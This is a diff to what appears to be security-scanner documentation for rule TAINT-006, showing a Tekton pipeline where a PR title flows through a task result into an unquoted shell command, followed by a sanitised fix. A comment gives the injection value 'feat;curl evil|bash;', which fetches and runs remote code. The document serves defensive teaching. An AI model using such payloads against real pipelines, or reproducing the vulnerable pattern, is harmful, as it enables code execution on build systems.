@@ -3299,6 +3299,66 @@ Body resolution: inline ``taskSpec:`` blocks are walked directly; ``taskRef: { n
 
 - If the producer task runs a sanitiser between the tainted ``$(params.X)`` interpolation and the ``$(results.Y.path)`` write, the consumer is no longer exploitable but TAINT-006 still fires. Suppress via ignore-file scoped to the consumer task name when this is the deliberate shape; the sanitiser is then load-bearing.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: Task ``extract`` writes the PR title to a
+# Tekton ``result``; Task ``use`` reads it back and
+# inlines it into a shell command. A PipelineRun whose
+# upstream provides ``feat;curl evil|bash;`` for the
+# title lands the metacharacters in ``use``'s shell.
+apiVersion: tekton.dev/v1
+kind: Pipeline
+spec:
+  params:
+    - name: pr-title
+  tasks:
+    - name: extract
+      taskSpec:
+        params: [{ name: title }]
+        results: [{ name: clean-title }]
+        steps:
+          - name: extract
+            image: alpine@sha256:abc123...
+            script: |
+              echo -n "$(params.title)" > $(results.clean-title.path)
+      params:
+        - { name: title, value: $(params.pr-title) }
+    - name: use
+      runAfter: [extract]
+      taskSpec:
+        params: [{ name: title }]
+        steps:
+          - name: use
+            image: alpine@sha256:abc123...
+            script: |
+              ./gen-notes --title $(params.title)
+      params:
+        - { name: title, value: $(tasks.extract.results.clean-title) }
+
+# Safe: sanitise at the producer Task (strip metacharacters
+# to an expected charset) before writing the result, and
+# bind the consumer's param to a shell env var that's
+# quoted on every use. The injected ``;`` / backticks
+# either never reach the result or are quoted away.
+apiVersion: tekton.dev/v1
+kind: Pipeline
+spec:
+  tasks:
+    - name: extract
+      taskSpec:
+        params: [{ name: title }]
+        results: [{ name: clean-title }]
+        steps:
+          - name: extract
+            image: alpine@sha256:abc123...
+            env:
+              - { name: RAW, value: $(params.title) }
+            script: |
+              echo -n "$RAW" | tr -dc 'a-zA-Z0-9 -' \
+                > $(results.clean-title.path)
+```
+
 **Source:** [`TAINT-006`](../providers/tekton.md#taint-006) in the [Tekton provider](../providers/tekton.md).
 
 ### `TAINT-007`: Untrusted input flows across templates via Argo ``outputs.parameters`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-007 }
